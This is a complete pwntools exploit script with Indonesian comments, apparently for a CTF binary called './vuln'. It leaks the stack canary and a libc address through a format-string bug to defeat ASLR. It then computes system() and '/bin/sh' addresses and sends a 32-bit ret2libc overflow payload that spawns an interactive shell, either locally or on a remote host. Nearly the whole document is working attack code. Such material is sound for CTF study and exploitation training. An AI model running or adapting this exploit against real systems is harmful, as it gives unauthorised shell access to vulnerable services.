from pwn import *

# === KONFIGURASI ===
exe = './vuln'
elf = ELF(exe)
context.binary = elf # Otomatis set arch 32-bit, endian, dll

# Pilih mode: 'local' untuk komputer sendiri, 'remote' untuk server NC
mode = 'local' 

if mode == 'local':
    p = process(exe)
    # libc = elf.libc # Gunakan jika libc lokal sama dengan target
else:
    # Masukkan IP dan Port server target NC
    p = remote('10.10.10.10', 1337)
    # Jika di server, tentukan file libc yang diberikan panitia CTF
    # libc = ELF('./libc.so.6') 

# --- FASE 1: LEAK CANARY & LIBC (ASLR BYPASS) ---
# Menggunakan format string untuk mengambil dua nilai sekaligus
# Contoh: %17$p untuk canary, %5$p untuk alamat puts di libc
log.info("Fase 1: Mencoba leak Canary dan alamat libc...")
p.recvuntil(b'Enter name:\n')

# Kirim format string
p.sendline(b'%5$p.%17$p')

# Terima output dan bersihkan
leak = p.recvline().strip().split(b'.')
puts_leak = int(leak[0], 16)
canary = int(leak[1], 16)

log.success(f"Leak Puts@libc: {hex(puts_leak)}")
log.success(f"Leak Canary: {hex(canary)}")

# --- FASE 2: HITUNG ALAMAT TARGET ---
# Offset puts, system, dan /bin/sh bersifat tetap relatif terhadap base
puts_offset = 0x067360   # Sesuaikan dengan hasil 'readelf -s'
system_offset = 0x03a920 # Sesuaikan offset
binsh_offset = 0x15ba0b   # Sesuaikan offset

libc_base = puts_leak - puts_offset
system_addr = libc_base + system_offset
binsh_addr = libc_base + binsh_offset
exit_addr = libc_base + 0x02e9d0 # Opsional, untuk exit bersih

log.info(f"LIBC Base: {hex(libc_base)}")
log.success(f"System() Address: {hex(system_addr)}")

# --- FASE 3: SUSUN PAYLOAD FINAL (RET2LIBC + CANARY) ---
# Payload: [Buffer Fill][Canary Asli][EBP Junk][System][Exit][Argumen /bin/sh]
log.info("Fase 3: Mengirim payload final...")

# Berdasarkan gambar, offset ke canary adalah 64 byte
payload = b'A' * 64
payload += p32(canary)       # Kembalikan canary asli agar tidak crash
payload += b'B' * 4          # Junk untuk menimpa Saved EBP
payload += p32(system_addr)  # Overwrite return address ke system()
payload += p32(exit_addr)    # Return address setelah system() selesai
payload += p32(binsh_addr)   # Argumen pertama untuk system()

p.recvuntil(b'Enter data:\n')
p.sendline(payload)

# --- FASE 4: INTERAKTIF ---
log.success("Exploit berhasil! Membuka shell...")
p.interactive()